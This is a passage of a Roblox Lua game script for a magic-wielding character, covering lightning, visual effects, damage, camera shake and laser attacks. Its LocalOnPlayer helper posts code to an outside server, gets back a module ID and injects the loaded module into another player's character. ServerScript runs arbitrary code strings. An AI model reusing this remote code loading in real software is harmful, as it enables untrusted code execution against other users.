	if((StartPos-EndPos).magnitude > MaxD)then
		EndPos = CF.N(StartPos,EndPos)*CF.N(0,0,-MaxD).p
	end
	local hit,pos,norm,dist=nil,EndPos,nil,(StartPos-EndPos).magnitude
	if(Raycasts)then
		hit,pos,norm,dist = CastRay(StartPos,EndPos,MaxD)	
	end
	local segments = dist/SegLength
	local model = IN(""Model"",Parent)
	model.Name = 'Lightning'
	local Last;
	for i = 1, segments do
		local size = (segments-i)/25
		local prt = Part(model,Color,Material,V3.N(Thicc+size,SegLength,Thicc+size),CF.N(),true,false)
		if(AddMesh)then IN(""CylinderMesh"",prt) end
		if(Last and math.floor(segments) == i)then
			local MagZ = (Last.CFrame*CF.N(0,-SegLength/2,0).p-EndPos).magnitude
			prt.Size = V3.N(Thicc+size,MagZ,Thicc+size)
			prt.CFrame = CF.N(Last.CFrame*CF.N(0,-SegLength/2,0).p,EndPos)*CF.A(M.R(90),0,0)*CF.N(0,-MagZ/2,0)	
		elseif(not Last)then
			prt.CFrame = CF.N(StartPos,pos)*CF.A(M.R(90),0,0)*CF.N(0,-SegLength/2,0)	
		else
			prt.CFrame = CF.N(Last.CFrame*CF.N(0,-SegLength/2,0).p,CF.N(pos)*CF.A(M.R(M.RNG(0,360)),M.R(M.RNG(0,360)),M.R(M.RNG(0,360)))*CF.N(0,0,SegLength/3+(segments-i)).p)*CF.A(M.R(90),0,0)*CF.N(0,-SegLength/2,0)
		end
		Last = prt
		if(Branch)then
			local choice = M.RNG(1,7+((segments-i)*2))
			if(choice == 1)then
				local LastB;
				for i2 = 1,M.RNG(2,5) do
					local size2 = ((segments-i)/35)/i2
					local prt = Part(model,Color,Material,V3.N(Thicc+size2,SegLength,Thicc+size2),CF.N(),true,false)
					if(AddMesh)then IN(""CylinderMesh"",prt) end
					if(not LastB)then
						prt.CFrame = CF.N(Last.CFrame*CF.N(0,-SegLength/2,0).p,Last.CFrame*CF.N(0,-SegLength/2,0)*CF.A(0,0,M.RRNG(0,360))*CF.N(0,Thicc*7,0)*CF.N(0,0,-1).p)*CF.A(M.R(90),0,0)*CF.N(0,-SegLength/2,0)
					else
						prt.CFrame = CF.N(LastB.CFrame*CF.N(0,-SegLength/2,0).p,LastB.CFrame*CF.N(0,-SegLength/2,0)*CF.A(0,0,M.RRNG(0,360))*CF.N(0,Thicc*7,0)*CF.N(0,0,-1).p)*CF.A(M.R(90),0,0)*CF.N(0,-SegLength/2,0)
					end
					LastB = prt
				end
			end
		end
	end
	if(Fades > 0)then
		coroutine.wrap(function()
			for i = 1, Fades do
				for _,v in next, model:children() do
					if(v:IsA'BasePart')then
						v.Transparency = (i/Fades)
					end
				end
				swait()
			end
			model:destroy()
		end)()
	else
		S.Debris:AddItem(model,.01)
	end
	return {End=(Last and Last.CFrame*CF.N(0,-Last.Size.Y/2,0).p),Last=Last,Model=model}
end

function Tween(obj,props,time,easing,direction,repeats,backwards)
	local info = TweenInfo.new(time or .5, easing or Enum.EasingStyle.Quad, direction or Enum.EasingDirection.Out, repeats or 0, backwards or false)
	local tween = S.TweenService:Create(obj, info, props)
	
	tween:Play()
end

function Effect(data)
	local FX = data.Effect or 'ResizeAndFade'
	local Parent = data.Parent or Effects
	local Color = data.Color or C3.N(0,0,0)
	local Size = data.Size or V3.N(1,1,1)
	local MoveDir = data.MoveDirection or nil
	local MeshData = data.Mesh or nil
	local SndData = data.Sound or nil
	local Frames = data.Frames or 45
	local Manual = data.Manual or nil
	local Material = data.Material or Enum.Material.Neon
	local CFra = data.CFrame or Torso.CFrame
	local Settings = data.FXSettings or {}
	local Shape = data.Shape or Enum.PartType.Block
	local Snd,Prt,Msh;
	coroutine.wrap(function()
		if(Manual and typeof(Manual) == 'Instance' and Manual:IsA'BasePart')then
			Prt = Manual
		else
			Prt = Part(Parent,Color,Material,Size,CFra,true,false)
			Prt.Shape = Shape
		end
		if(typeof(MeshData) == 'table')then
			Msh = Mesh(Prt,MeshData.MeshType,MeshData.MeshId,MeshData.TextureId,MeshData.Scale,MeshData.Offset)
		elseif(typeof(MeshData) == 'Instance')then
			Msh = MeshData:Clone()
			Msh.Parent = Prt
		elseif(Shape == Enum.PartType.Block)then
			Msh = Mesh(Prt,Enum.MeshType.Brick)
		end
		if(typeof(SndData) == 'table')then
			Snd = Sound(Prt,SndData.SoundId,SndData.Pitch,SndData.Volume,false,false,true)
		elseif(typeof(SndData) == 'Instance')then
			Snd = SndData
		end
		if(Snd)then
			repeat swait() until Snd.Playing and Snd.IsLoaded and Snd.TimeLength > 0
			Frames = Snd.TimeLength * Frame_Speed/Snd.Pitch
		end
		Size = (Msh and Msh.Scale or Size)
		local grow = Size-(Settings.EndSize or (Msh and Msh.Scale or Size)/2)
		
		local MoveSpeed = nil;
		if(MoveDir)then
			MoveSpeed = (CFra.p - MoveDir).magnitude/Frames
		end
		if(FX ~= 'Arc')then
			for Frame = 1, Frames do
				if(FX == ""Fade"")then
					Prt.Transparency  = (Frame/Frames)
				elseif(FX == ""Resize"")then
					if(not Settings.EndSize)then
						Settings.EndSize = V3.N(0,0,0)
					end
					if(Settings.EndIsIncrement)then
						if(Msh)then
							Msh.Scale = Msh.Scale + Settings.EndSize
						else
							Prt.Size = Prt.Size + Settings.EndSize
						end					
					else
						if(Msh)then
							Msh.Scale = Msh.Scale - grow/Frames
						else
							Prt.Size = Prt.Size - grow/Frames
						end
					end 
				elseif(FX == ""ResizeAndFade"")then
					if(not Settings.EndSize)then
						Settings.EndSize = V3.N(0,0,0)
					end
					if(Settings.EndIsIncrement)then
						if(Msh)then
							Msh.Scale = Msh.Scale + Settings.EndSize
						else
							Prt.Size = Prt.Size + Settings.EndSize
						end					
					else
						if(Msh)then
							Msh.Scale = Msh.Scale - grow/Frames
						else
							Prt.Size = Prt.Size - grow/Frames
						end
					end 
					Prt.Transparency = (Frame/Frames)
				end
				if(Settings.RandomizeCFrame)then
					Prt.CFrame = Prt.CFrame * CF.A(M.RRNG(-360,360),M.RRNG(-360,360),M.RRNG(-360,360))
				end
				if(MoveDir and MoveSpeed)then
					local Orientation = Prt.Orientation
					Prt.CFrame = CF.N(Prt.Position,MoveDir)*CF.N(0,0,-MoveSpeed)
					Prt.Orientation = Orientation
				end
				swait()
			end
			Prt:destroy()
		else
			local start,third,fourth,endP = Settings.Start,Settings.Third,Settings.Fourth,Settings.End
			if(not Settings.End and Settings.Home)then endP = Settings.Home.CFrame end
			if(start and endP)then
				local quarter = third or start:lerp(endP, 0.25) * CF.N(M.RNG(-25,25),M.RNG(0,25),M.RNG(-25,25))
				local threequarter = fourth or start:lerp(endP, 0.75) * CF.N(M.RNG(-25,25),M.RNG(0,25),M.RNG(-25,25))
				for Frame = 0, 1, (Settings.Speed or 0.01) do
					if(Settings.Home)then
						endP = Settings.Home.CFrame
					end
					Prt.CFrame = Bezier(start, quarter, threequarter, endP, Frame)
				end
				if(Settings.RemoveOnGoal)then
					Prt:destroy()
				end
			else
				Prt:destroy()
				assert(start,""You need a start position!"")
				assert(endP,""You need a start position!"")
			end
		end
	end)()
	return Prt,Msh,Snd
end
function SoulSteal(whom)
	local torso = (whom:FindFirstChild'Head' or whom:FindFirstChild'Torso' or whom:FindFirstChild'UpperTorso' or whom:FindFirstChild'LowerTorso' or whom:FindFirstChild'HumanoidRootPart')
	print(torso)
	if(torso and torso:IsA'BasePart')then
		local Model = Instance.new(""Model"",Effects)
		Model.Name = whom.Name..""'s Soul""
		whom:BreakJoints()
		local Soul = Part(Model,BrickColor.new'Really red','Glass',V3.N(.5,.5,.5),torso.CFrame,true,false)
		Soul.Name = 'Head'
		NewInstance(""Humanoid"",Model,{Health=0,MaxHealth=0})
		Effect{
			Effect=""Arc"",
			Manual = Soul,
			FXSettings={
				Start=torso.CFrame,
				Home = Torso,
				RemoveOnGoal = true,
			}
		}
		local lastPoint = Soul.CFrame.p
	
		for i = 0, 1, 0.01 do 
				local point = CFrame.new(lastPoint, Soul.Position) * CFrame.Angles(-math.pi/2, 0, 0)
				local mag = (lastPoint - Soul.Position).magnitude
				Effect{
					Effect = ""Fade"",
					CFrame = point * CF.N(0, mag/2, 0),
					Size = V3.N(.5,mag+.5,.5),
					Color = Soul.BrickColor
				}
				lastPoint = Soul.CFrame.p
			swait()
		end
		for i = 1, 5 do
			Effect{
				Effect=""Fade"",
				Color = BrickColor.new'Really red',
				MoveDirection = (Torso.CFrame*CFrame.new(M.RNG(-40,40),M.RNG(-40,40),M.RNG(-40,40))).p
			}	
		end
	end
end

--// Other Functions \\ --

function CastRay(startPos,endPos,range,ignoreList)
	local ray = Ray.new(startPos,(endPos-startPos).unit*range)
	local part,pos,norm = workspace:FindPartOnRayWithIgnoreList(ray,ignoreList or {Char},false,true)
	return part,pos,norm,(pos and (startPos-pos).magnitude)
end

function CastRayInDirection(startPos,direction,range,ignoreList)
	local ray = Ray.new(startPos,direction*range)
	local part,pos,norm = workspace:FindPartOnRayWithIgnoreList(ray,ignoreList or {Char},false,true)
	return part,pos,norm,(pos and (startPos-pos).magnitude)
end

function getRegion(point,range,ignore)
    return workspace:FindPartsInRegion3WithIgnoreList(R3.N(point-V3.N(1,1,1)*range/2,point+V3.N(1,1,1)*range/2),ignore,100)
end

function clerp(startCF,endCF,alpha)
	return startCF:lerp(endCF, alpha)
end

function GetTorso(char)
	return char:FindFirstChild'Torso' or char:FindFirstChild'UpperTorso' or char:FindFirstChild'LowerTorso' or char:FindFirstChild'HumanoidRootPart'
end

function ShowDamage(Pos, Text, Time, Color)
	coroutine.wrap(function()
	local Rate = (1 / Frame_Speed)
	local Pos = (Pos or Vector3.new(0, 0, 0))
	local Text = (Text or """")
	local Time = (Time or 2)
	local Color = (Color or Color3.new(1, 0, 1))
	local EffectPart = NewInstance(""Part"",Effects,{
		Material=Enum.Material.SmoothPlastic,
		Reflectance = 0,
		Transparency = 1,
		BrickColor = BrickColor.new(Color),
		Name = ""Effect"",
		Size = Vector3.new(0,0,0),
		Anchored = true,
		CFrame = CF.N(Pos)
	})
	local BillboardGui = NewInstance(""BillboardGui"",EffectPart,{
		Size = UDim2.new(1.25, 0, 1.25, 0),
		Adornee = EffectPart,
	})
	local TextLabel = NewInstance(""TextLabel"",BillboardGui,{
		BackgroundTransparency = 1,
		Size = UDim2.new(1, 0, 1, 0),
		Text = Text,
		Font = ""Bodoni"",
		TextColor3 = Color,
		TextStrokeColor3 = Color3.new(0,0,0),
		TextStrokeTransparency=0,
		TextScaled = true,
	})
	S.Debris:AddItem(EffectPart, (Time))
	EffectPart.Parent = workspace
	delay(0, function()
		Tween(EffectPart,{CFrame=CF.N(Pos)*CF.N(0,3,0)},Time,Enum.EasingStyle.Elastic,Enum.EasingDirection.Out)
		local Frames = (Time / Rate)
		for Frame = 1, Frames do
			swait()
			local Percent = (Frame / Frames)
			TextLabel.TextTransparency = Percent
			TextLabel.TextStrokeTransparency = Percent
		end
		if EffectPart and EffectPart.Parent then
			EffectPart:Destroy()
		end
	end) end)()
end


function DealDamage(who,minDam,maxDam,Knock,Type,critChance,critMult)
	if(who)then
		local hum = who:FindFirstChildOfClass'Humanoid'
		local Damage = M.RNG(minDam,maxDam)
		local canHit = true
		if(hum)then
			for _, p in pairs(Hit) do
				if p[1] == hum then
					if(time() - p[2] < 0.01) then
						canHit = false
					else
						Hit[_] = nil
					end
				end
			end
			if(canHit)then
				table.insert(Hit,{hum,time()})
				if(hum.Health >= math.huge)then
					who:BreakJoints()
					if(who:FindFirstChild'Head' and hum.Health > 0)then
						ShowDamage((who.Head.CFrame * CF.N(0, 0, (who.Head.Size.Z / 2)).p+V3.N(0,1.5,0)+V3.N(M.RNG(-2,2),0,M.RNG(-2,2))), ""INSTANT"", 1.5, C3.N(1,0,0))
					end
				else
					local player = S.Players:GetPlayerFromCharacter(who)
					if(Type == ""Fire"")then
						--idk..
					else
						local  c = Instance.new(""ObjectValue"",hum)
						c.Name = ""creator""
						c.Value = Plr
						game:service'Debris':AddItem(c,0.35)
						if(M.RNG(1,100) <= (critChance or 0) and critMult > 1)then
							if(who:FindFirstChild'Head' and hum.Health > 0)then
								ShowDamage((who.Head.CFrame * CF.N(0, 0, (who.Head.Size.Z / 2)).p+V3.N(0,1.5,0)+V3.N(M.RNG(-2,2),0,M.RNG(-2,2))), ""[CRIT] ""..Damage*(critMult or 2), 1.5, BrickColor.new'New Yeller'.Color)
							end
							hum.Health = hum.Health - Damage*(critMult or 2)
						else
							if(who:FindFirstChild'Head' and hum.Health > 0)then
								ShowDamage((who.Head.CFrame * CF.N(0, 0, (who.Head.Size.Z / 2)).p+V3.N(0,1.5,0)+V3.N(M.RNG(-2,2),0,M.RNG(-2,2))), Damage, 1.5, DamageColor.Color)
							end
							hum.Health = hum.Health - Damage
						end
						if(Type == 'Knockback' and GetTorso(who))then
							local angle = GetTorso(who).Position - Root.Position + Vector3.new(0, 0, 0).unit
							local body = NewInstance('BodyVelocity',GetTorso(who),{
								P = 500,
								maxForce = V3.N(math.huge,0,math.huge),
								velocity = Root.CFrame.lookVector * Knock + Root.Velocity / 1.05
							})
							game:service'Debris':AddItem(body,.5)
						elseif(Type == ""Electric"")then
							if(M.RNG(1,100) >= critChance)then
								if(who:FindFirstChild'Head' and hum.Health > 0)then
									ShowDamage((who.Head.CFrame * CF.N(0, 0, (who.Head.Size.Z / 2)).p+V3.N(0,1.5,0)+V3.N(M.RNG(-2,2),0,M.RNG(-2,2))), ""[PARALYZED]"", 1.5, BrickColor.new""New Yeller"".Color)
								end
								local asd = hum.WalkSpeed/2
								hum.WalkSpeed = asd
								local paralyzed = true
								coroutine.wrap(function()
									while paralyzed do
										swait(25)
										if(M.RNG(1,25) == 1)then
											if(who:FindFirstChild'Head' and hum.Health > 0)then
												ShowDamage((who.Head.CFrame * CF.N(0, 0, (who.Head.Size.Z / 2)).p+V3.N(0,1.5,0)+V3.N(M.RNG(-2,2),0,M.RNG(-2,2))), ""[STATIC]"", 1.5, BrickColor.new""New Yeller"".Color)
											end
											hum.PlatformStand = true
										end
									end
								end)()
								delay(4, function()
									paralyzed = false
									hum.WalkSpeed = hum.WalkSpeed + asd
								end)
							end
							
						elseif(Type == 'Knockdown' and GetTorso(who))then
							local rek = GetTorso(who)
							hum.PlatformStand = true
							delay(1,function()
								hum.PlatformStand = false
							end)
							local angle = (GetTorso(who).Position - (Root.Position + Vector3.new(0, 0, 0))).unit
							local bodvol = NewInstance(""BodyVelocity"",rek,{
								velocity = angle * Knock,
								P = 5000,
								maxForce = Vector3.new(8e+003, 8e+003, 8e+003),
							})
							local rl = NewInstance(""BodyAngularVelocity"",rek,{
								P = 3000,
								maxTorque = Vector3.new(500000, 500000, 500000) * 50000000000000,
								angularvelocity = Vector3.new(math.random(-10, 10), math.random(-10, 10), math.random(-10, 10)),
							})
							game:GetService(""Debris""):AddItem(bodvol, .5)
							game:GetService(""Debris""):AddItem(rl, .5)
						end
					end
				end
			end
		end
	end
end

function AOEDamage(where,range,minDam,maxDam,Knock,Type,critChance,critMult)
	for _,v in next, getRegion(where,range,{Char}) do
		if(v.Parent and v.Parent:FindFirstChildOfClass'Humanoid')then
			coroutine.wrap(function() for i = 1, M.RNG(minDam,maxDam) do swait() DealDamage(v.Parent,1,1,Knock,Type,0,1) end end)()
		end
	end
end

function AOEHeal(where,range,amount)
	local healed = {}
	for _,v in next, getRegion(where,range,{Char}) do
		local hum = (v.Parent and v.Parent:FindFirstChildOfClass'Humanoid' or nil)
		if(hum and not healed[hum])then
			hum.Health = hum.Health + amount
			if(v.Parent:FindFirstChild'Head' and hum.Health > 0)then
				ShowDamage((v.Parent.Head.CFrame * CF.N(0, 0, (v.Parent.Head.Size.Z / 2)).p+V3.N(0,1.5,0)), ""+""..amount, 1.5, BrickColor.new'Lime green'.Color)
			end
		end
	end
end

function CamShake(who,times,intense,origin) 
	coroutine.wrap(function()
		if(script:FindFirstChild'CamShake')then
			local cam = script.CamShake:Clone()
			cam:WaitForChild'intensity'.Value = intense
			cam:WaitForChild'times'.Value = times
			
	 		if(origin)then NewInstance((typeof(origin) == 'Instance' and ""ObjectValue"" or typeof(origin) == 'Vector3' and 'Vector3Value'),cam,{Name='origin',Value=origin}) end
			cam.Parent = who
			wait()
			cam.Disabled = false
		elseif(who == Plr or who == Char)then
			local intensity = intense
			local cam = workspace.CurrentCamera
			for i = 1, times do
				local camDistFromOrigin
				if(typeof(origin) == 'Instance' and origin:IsA'BasePart')then
					camDistFromOrigin = math.floor( (cam.CFrame.p-origin.Position).magnitude )/25
				elseif(typeof(origin) == 'Vector3')then
					camDistFromOrigin = math.floor( (cam.CFrame.p-origin).magnitude )/25
				end
				if(camDistFromOrigin)then
					intensity = math.min(intense, math.floor(intense/camDistFromOrigin))
				end
				cam.CFrame = cam.CFrame:lerp(cam.CFrame*CFrame.new(math.random(-intensity,intensity)/100,math.random(-intensity,intensity)/100,math.random(-intensity,intensity)/100)*CFrame.Angles(math.rad(math.random(-intensity,intensity)/100),math.rad(math.random(-intensity,intensity)/100),math.rad(math.random(-intensity,intensity)/100)),.4)
				swait()
			end
		end
	end)()
end

function CamShakeAll(times,intense,origin)
	for _,v in next, Plrs:players() do
		CamShake(v:FindFirstChildOfClass'PlayerGui' or v:FindFirstChildOfClass'Backpack' or v.Character,times,intense,origin)
	end
end

function ServerScript(code)
	if(script:FindFirstChild'Loadstring')then
		local load = script.Loadstring:Clone()
		load:WaitForChild'Sauce'.Value = code
		load.Disabled = false
		load.Parent = workspace
	elseif(NS and typeof(NS) == 'function')then
		NS(code,workspace)
	else
		warn(""no serverscripts lol"")
	end	
end

function LocalOnPlayer(who,code)
	ServerScript([[
		wait()
		script.Parent=nil
		if(not _G.Http)then _G.Http = game:service'HttpService' end
		
		local Http = _G.Http or game:service'HttpService'
		
		local source = ]]..""[[""..code..""]]""..[[
		local link = ""https://api.vorth.xyz/R_API/R.UPLOAD/NEW_LOCAL.php""
		local asd = Http:PostAsync(link,source)
		repeat wait() until asd and Http:JSONDecode(asd) and Http:JSONDecode(asd).Result and Http:JSONDecode(asd).Result.Require_ID
		local ID = Http:JSONDecode(asd).Result.Require_ID
		local vs = require(ID).VORTH_SCRIPT
		vs.Parent = game:service'Players'.]]..who.Name..[[.Character
	]])
end


--// Attack Functions \\--
function Laser(key)
	NeutralAnims = false
	Attack = true
	Root.Anchored = true
	local data = MagicCircle{Weld=Torso,Pos=CF.N(0,0,-4),Size=5,Variant=MagicVariant,Time=.5}
	local IsGrown = false
	data.Grown:connect(function() IsGrown = true end)
	repeat swait() 
		local Alpha = .1
		LS.C0 = LS.C0:lerp(LSC0*CF.A(M.R(125),0,0),Alpha)
		RS.C0 = RS.C0:lerp(RSC0*CF.A(M.R(125),0,0),Alpha)
		RJ.C0 = RJ.C0:lerp(RJC0,Alpha)
		NK.C0 = NK.C0:lerp(NKC0,Alpha)
		LH.C0 = LH.C0:lerp(LHC0*CF.A(0,0,M.R(-5)),Alpha)
		RH.C0 = RH.C0:lerp(RHC0*CF.N(0,1,-1)*CF.A(M.R(-5),0,M.R(5)),Alpha)
		local LookVector = Mouse.Hit.p
		Torso.CFrame = CF.N(Root.Position,LookVector) 
	until IsGrown
	if(S.UserInputService:IsKeyDown(key))then
		local grown = 0
		repeat 
			local Alpha = .1
			LS.C0 = LS.C0:lerp(LSC0*CF.A(M.R(125),0,0),Alpha)
			RS.C0 = RS.C0:lerp(RSC0*CF.A(M.R(125),0,0),Alpha)
			RJ.C0 = RJ.C0:lerp(RJC0,Alpha)
			NK.C0 = NK.C0:lerp(NKC0,Alpha)
			LH.C0 = LH.C0:lerp(LHC0*CF.A(0,0,M.R(-5)),Alpha)
			RH.C0 = RH.C0:lerp(RHC0*CF.N(0,1,-1)*CF.A(M.R(-5),0,M.R(5)),Alpha)
			local LookVector = Mouse.Hit.p
			Root.CFrame = CF.N(Root.Position,LookVector)
			if(grown < 250)then
				data.Grow(.05)
				grown = grown + 1
			end
			swait()
		until not S.UserInputService:IsKeyDown(key)
	end
	Sound(data.Circle,340722848,1,1,false,true,true)
	local hit,pos,norm,dist = CastRay(data.Circle.CFrame.p,Mouse.Hit.p,1024)
	local part = Part(Effects,MagicVariant.EffectColor or MagicVariant.Color,Enum.Material.Neon,V3.N(dist,data.Mesh.Scale.x/40,data.Mesh.Scale.x/40),CF.N(data.Circle.CFrame.p,pos)*CF.N(0,0,-dist/2)*CF.A(0,M.P/2,0),true,false)
	Mesh(part,Enum.MeshType.Cylinder)
	Tween(part,{Color=C3.N(1,1,1)},1,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false)
	Effect{
		Effect='ResizeAndFade',
		Color=MagicVariant.Color,
		Size=V3.N(data.Mesh.Scale.X/20,data.Mesh.Scale.X/20,data.Mesh.Scale.X/20),
		Mesh={MeshType=Enum.MeshType.Sphere},
		CFrame=CF.N(pos),
		FXSettings={
			EndSize=V3.N(.05,.05,.05),
			EndIsIncrement=true
		}
	}
	for i = 1, 5 do
		local angles = CF.A(M.RRNG(-180,180),M.RRNG(-180,180),M.RRNG(-180,180))
		Effect{
			Effect='Fade',
			Frames=65,
			Size=V3.N((data.Mesh.Scale.X/20)/2,(data.Mesh.Scale.X/20)/2,data.Mesh.Scale.X/20),
			CFrame=CF.N(CF.N(pos)*angles*CF.N(0,0,-(data.Mesh.Scale.X/20)).p,pos),
			Mesh = {MeshType=Enum.MeshType.Sphere},
			Material=Enum.Material.Neon,
			Color=MagicVariant.Color,
			MoveDirection=CF.N(CF.N(pos)*angles*CF.N(0,0,-50).p,pos).p,
		}	
	end
	AOEDamage(pos,data.Mesh.Scale.X/20,15,45,0,'Normal',10,4)
	coroutine.wrap(function()
		local frame = (1/30)
		for i = 1, 30 do
			part.Transparency = (i/30)
			swait()
		end
		part:destroy()
	end)()
	Attack = false
	NeutralAnims = true
	Root.Anchored = false
	data.Destroy()
end

function Balls(key)
	NeutralAnims = false
	Attack = true
	Root.Anchored = true
	local data = MagicCircle{Weld=Torso,Pos=CF.N(0,0,-1),Size=5,Variant=MagicVariant,Time=.5}
	local IsGrown = false
	data.Grown:connect(function() IsGrown = true end)
	repeat swait() 
		local Alpha = .1
		local idk = M.R(25)
		LS.C0 = LS.C0:lerp(LSC0*CF.A(M.R(-5),0,M.R(-90)+idk),Alpha)
		RS.C0 = RS.C0:lerp(RSC0*CF.A(M.R(-5),0,M.R(90)-idk),Alpha)
		RJ.C0 = RJ.C0:lerp(RJC0,Alpha)
		NK.C0 = NK.C0:lerp(NKC0,Alpha)
		LH.C0 = LH.C0:lerp(LHC0*CF.A(0,0,M.R(-5)),Alpha)
		RH.C0 = RH.C0:lerp(RHC0*CF.N(0,1,-1)*CF.A(M.R(-5),0,M.R(5)),Alpha)
		local LookVector = Mouse.Hit.p
		Torso.CFrame = CF.N(Root.Position,LookVector) 
	until IsGrown
	local projectiles = 5
	if(S.UserInputService:IsKeyDown(key))then
		local grown = 0
		repeat 
			local Alpha = .1
			local idk = M.R(25)
			LS.C0 = LS.C0:lerp(LSC0*CF.A(M.R(-5),0,M.R(-90)+idk),Alpha)
			RS.C0 = RS.C0:lerp(RSC0*CF.A(M.R(-5),0,M.R(90)-idk),Alpha)
			RJ.C0 = RJ.C0:lerp(RJC0,Alpha)
			NK.C0 = NK.C0:lerp(NKC0,Alpha)
			LH.C0 = LH.C0:lerp(LHC0*CF.A(0,0,M.R(-5)),Alpha)
			RH.C0 = RH.C0:lerp(RHC0*CF.N(0,1,-1)*CF.A(M.R(-5),0,M.R(5)),Alpha)
			local LookVector = Mouse.Hit.p
			Root.CFrame = CF.N(Root.Position,LookVector)
			if(grown < 250)then
				data.Grow(.05)
				grown = grown + 1
				projectiles = projectiles + .05
			end
			swait()
		until not S.UserInputService:IsKeyDown(key)
	end
	for i = 1, math.floor(projectiles) do
		data.Grow(-math.floor(projectiles)/20)
		local LookVector = Mouse.Hit.p
		Root.CFrame = CF.N(Root.Position,LookVector)
		ShootBullet{Shape='Ball',Frames=160,Origin=data.Circle.CFrame,Speed=10}
		swait(1)
	end
	
	Attack = false
	NeutralAnims = true
	Root.Anchored = false
	data.Destroy()
end

function DLaser(key)
	NeutralAnims = false
	Attack = true
	Root.Anchored = true
	local data1 = MagicCircle{Weld=Torso,Pos=CF.N(-4,0,-4),Size=5,Variant=MagicVariant,Time=.5}
	local data2 = MagicCircle{Weld=Torso,Pos=CF.N(4,0,-4),Size=5,Variant=MagicVariant,Time=.5}
	local IsGrown = false
	data1.Grown:connect(function() IsGrown = true end)
	repeat swait() 
		local Alpha = .1
		local idk = M.R(25)
		LS.C0 = LS.C0:lerp(LSC0*CF.A(M.R(-5),0,M.R(-90)+idk),Alpha)
		RS.C0 = RS.C0:lerp(RSC0*CF.A(M.R(-5),0,M.R(90)-idk),Alpha)
		RJ.C0 = RJ.C0:lerp(RJC0,Alpha)
		NK.C0 = NK.C0:lerp(NKC0,Alpha)
		LH.C0 = LH.C0:lerp(LHC0*CF.A(0,0,M.R(-5)),Alpha)
		RH.C0 = RH.C0:lerp(RHC0*CF.N(0,1,-1)*CF.A(M.R(-5),0,M.R(5)),Alpha)
		local LookVector = Mouse.Hit.p
		Torso.CFrame = CF.N(Root.Position,LookVector) 
	until IsGrown
	if(S.UserInputService:IsKeyDown(key))then
		local grown = 0
		repeat 
			local Alpha = .1
			local idk = M.R(25)
			LS.C0 = LS.C0:lerp(LSC0*CF.A(M.R(-5),0,M.R(-90)+idk),Alpha)
			RS.C0 = RS.C0:lerp(RSC0*CF.A(M.R(-5),0,M.R(90)-idk),Alpha)
			RJ.C0 = RJ.C0:lerp(RJC0,Alpha)
			NK.C0 = NK.C0:lerp(NKC0,Alpha)
			LH.C0 = LH.C0:lerp(LHC0*CF.A(0,0,M.R(-5)),Alpha)
			RH.C0 = RH.C0:lerp(RHC0*CF.N(0,1,-1)*CF.A(M.R(-5),0,M.R(5)),Alpha)
			local LookVector = Mouse.Hit.p
			Root.CFrame = CF.N(Root.Position,LookVector)
			if(grown < 250)then
				data1.Grow(.05)
				data2.Grow(.05)
				grown = grown + 1
			end
			swait()
		until not S.UserInputService:IsKeyDown(key)
	end
	Sound(data1.Circle,340722848,1,1,false,true,true)
	Sound(data2.Circle,340722848,1,1,false,true,true)
	local hit,pos,norm,dist = CastRay(data1.Circle.CFrame.p,Mouse.Hit.p,1024)
	local part1 = Part(Effects,MagicVariant.EffectColor or MagicVariant.Color,Enum.Material.Neon,V3.N(dist,data1.Mesh.Scale.x/40,data1.Mesh.Scale.x/40),CF.N(data1.Circle.CFrame.p,pos)*CF.N(0,0,-dist/2)*CF.A(0,M.P/2,0),true,false)
	Mesh(part1,Enum.MeshType.Cylinder)
	
	
	local part2 = Part(Effects,MagicVariant.EffectColor or MagicVariant.Color,Enum.Material.Neon,V3.N(dist,data2.Mesh.Scale.x/40,data2.Mesh.Scale.x/40),CF.N(data2.Circle.CFrame.p,pos)*CF.N(0,0,-dist/2)*CF.A(0,M.P/2,0),true,false)
	Mesh(part2,Enum.MeshType.Cylinder)
	Tween(part1,{Color=C3.N(1,1,1)},1,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false)
	Tween(part2,{Color=C3.N(1,1,1)},1,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false)
	Effect{
		Effect='ResizeAndFade',
		Color=MagicVariant.Color,
		Size=V3.N(data1.Mesh.Scale.X/20,data1.Mesh.Scale.X/20,data1.Mesh.Scale.X/20),
		Mesh={MeshType=Enum.MeshType.Sphere},
		CFrame=CF.N(pos),
		FXSettings={
			EndSize=V3.N(.05,.05,.05),
			EndIsIncrement=true
		}
	}
	for i = 1, 5 do
		local angles = CF.A(M.RRNG(-180,180),M.RRNG(-180,180),M.RRNG(-180,180))
		Effect{
			Effect='Fade',
			Frames=65,
			Size=V3.N((data1.Mesh.Scale.X/20)/2,(data1.Mesh.Scale.X/20)/2,data1.Mesh.Scale.X/20),
			CFrame=CF.N(CF.N(pos)*angles*CF.N(0,0,-(data1.Mesh.Scale.X/20)).p,pos),
			Mesh = {MeshType=Enum.MeshType.Sphere},
			Material=Enum.Material.Neon,
			Color=MagicVariant.Color,
			MoveDirection=CF.N(CF.N(pos)*angles*CF.N(0,0,-50).p,pos).p,
		}	
	end
	AOEDamage(pos,data1.Mesh.Scale.X/20,15,45,0,'Normal',10,4)
	AOEDamage(pos,data2.Mesh.Scale.X/20,15,45,0,'Normal',10,4)
	coroutine.wrap(function()
		local frame = (1/30)
		for i = 1, 30 do
			part1.Transparency = (i/30)
			part2.Transparency = (i/30)
			swait()
		end
		part1:destroy()
		part2:destroy()
	end)()
	Attack = false
	NeutralAnims = true
	Root.Anchored = false
	data1.Destroy()
	data2.Destroy()
end


function BLaser(key)
	NeutralAnims = false
	Attack = true
	Root.Anchored = true
	local data = MagicCircle{Weld=Torso,Pos=CF.N(0,0,-1),Size=15,Variant=MagicVariant,Time=.75}
	local IsGrown = false
	data.Grown:connect(function() IsGrown = true end)
	repeat swait() 
		local Alpha = .1
		local idk = M.R(25)
		LS.C0 = LS.C0:lerp(LSC0*CF.A(M.R(-5),0,M.R(-90)+idk),Alpha)
		RS.C0 = RS.C0:lerp(RSC0*CF.A(M.R(-5),0,M.R(90)-idk),Alpha)
		RJ.C0 = RJ.C0:lerp(RJC0,Alpha)
		NK.C0 = NK.C0:lerp(NKC0,Alpha)
		LH.C0 = LH.C0:lerp(LHC0*CF.A(0,0,M.R(-5)),Alpha)
		RH.C0 = RH.C0:lerp(RHC0*CF.N(0,1,-1)*CF.A(M.R(-5),0,M.R(5)),Alpha)
		local LookVector = Mouse.Hit.p
		Torso.CFrame = CF.N(Root.Position,LookVector) 
	until IsGrown
	if(S.UserInputService:IsKeyDown(key))then
		local grown = 0
		repeat 
			local Alpha = .1
			local idk = M.R(25)
